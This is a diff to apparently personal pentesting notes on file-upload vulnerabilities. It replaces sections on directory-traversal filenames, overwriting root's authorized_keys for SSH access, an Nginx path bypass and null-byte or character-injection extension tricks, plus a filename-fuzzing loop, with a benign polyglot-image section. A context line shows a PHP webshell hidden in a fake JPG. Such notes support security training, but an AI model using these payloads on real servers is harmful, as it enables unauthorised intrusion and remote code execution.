@@ -21,6 +21,8 @@ Upload the file to the server using the vulnerable file upload functionality.
 After uploading the file, access it by navigating to its URL. The  code inside the file will be executed by the server.
 
 
+
+
 ---
 
 
@@ -125,134 +127,44 @@ echo 'FFD8FFDB' | xxd -r -p > exploit.php.jpg && echo '<?php system($_GET["cmd"]
 
 ---
 
-## Using Non-Executable File Uploads
+## Polyglot Files
 
-A file upload vulnerability does not always allow direct code execution. In some cases, the backend does not interpret uploaded files (e.g., no PHP), so webshells are useless.
+A polyglot file is a file that is valid in multiple formats at the same time. This can bypass upload filters that validate extensions, MIME types, or file signatures.
 
-However, the vulnerability can still be exploited by combining it with **Directory Traversal**.
+Instead of changing only the extension or magic bytes, the file keeps a valid structure while embedding extra content (for example, metadata).
 
+Example (Image + Extra Content)
 
-### Path Injection via Filename
-
-If the application does not sanitize the `filename` parameter, we can inject relative paths:
-
-```http
-Content-Disposition: form-data; name="file"; filename="../../../../../../../tmp/test.txt"
-```
-
-This may allow writing files **outside the upload directory**.
-
-The result is often blind, so success must be assumed and tested indirectly.
-
-### Arbitrary File Write - SSH Access
-
-Instead of uploading a shell, we overwrite sensitive files like:
-
-```text
-/root/.ssh/authorized_keys
-```
-
-Prepare a key:
+Create a polyglot file starting from a valid image:
 
 ```bash
-ssh-keygen -t rsa -f fileup
-cat fileup.pub > authorized_keys
+cp valid_image.jpg polyglot.jpg
 ```
 
-Upload it with traversal:
-
-```text
-filename=../../../../../../../root/.ssh/authorized_keys
-```
-
-### Access via SSH
+Append extra data without breaking the image:
 
 ```bash
-ssh -i fileup root@target 
+echo 'test-data' >> polyglot.jpg
 ```
 
-If successful, we get access without a password.
-
-
----
-
-## Bypassing Extension Filters in Nginx
-
-Some Nginx configurations attempt to restrict the execution of certain file types, such as `.php`, to prevent unauthorized code execution. However, misconfigurations can allow attackers to bypass these restrictions and execute scripts by exploiting how Nginx handles file paths.
-
-#### Example Scenario
-
-Imagine an upload directory where only image files (e.g., `.png`, `.jpg`) are allowed, and `.php` files are blocked. However, an attacker uploads a file named `rev.png/rev.php`, resulting in a directory structure like:
-
-```
-/uploads/rev.png
-```
-
-Now, if Nginx is misconfigured and allows execution of PHP files in subdirectories, the attacker might be able to execute the script with a request like:
-
-```
-http://example.com/uploads/rev.png/rev.php?cmd=whoami
-```
-
-Aquí tienes la sección adaptada a tu formato de apuntes, clara y directa:
-
----
-
-## PHP Character Injection
-
-Some applications validate file uploads by checking the extension, but they may misinterpret filenames if special characters are injected.
-
-By adding specific characters before or after the extension, we can trick the server into **bypassing the whitelist** and executing the file as PHP.
-
-### Common Characters
+Embed content into metadata:
 
 ```bash
-%20
-%0a
-%00
-%0d0a
-/
-.\
-.
-…
-:
+exiftool -Comment='test-data' image.jpg -o polyglot-meta.jpg
 ```
 
-Each character can affect how the filename is parsed.
+Verify file integrity and upload the file:
 
-#### Examples
+```bash
+file polyglot.jpg
+exiftool polyglot-meta.jpg
+strings polyglot.jpg
+```
 
-- **Null byte (old PHP versions):**
+Why It Works
+
+- The file keeps valid magic bytes
     
-
-```bash
-shell.php%00.jpg
-```
-
-The server stops at `%00` → saved as `shell.php`
-
-- **Windows bypass:**
+- MIME validation still passes
     
-
-```bash
-shell.aspx:.jpg
-```
-
-The file may be interpreted as `shell.aspx`
-
-### Fuzzing Filenames
-
-We can write a small bash script that generates all permutations of the file name, where the above characters would be injected before and after both the `PHP` and `JPG` extensions, as follows:
-
-```bash
-for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
-    for ext in '.php' '.phps'; do
-        echo "shell$char$ext.jpg" >> wordlist.txt
-        echo "shell$ext$char.jpg" >> wordlist.txt
-        echo "shell.jpg$char$ext" >> wordlist.txt
-        echo "shell.jpg$ext$char" >> wordlist.txt
-    done
-done
-```
-
-This wordlist can be used to bypass the whitelist test and execute PHP code.
+- Basic file inspection often accepts it
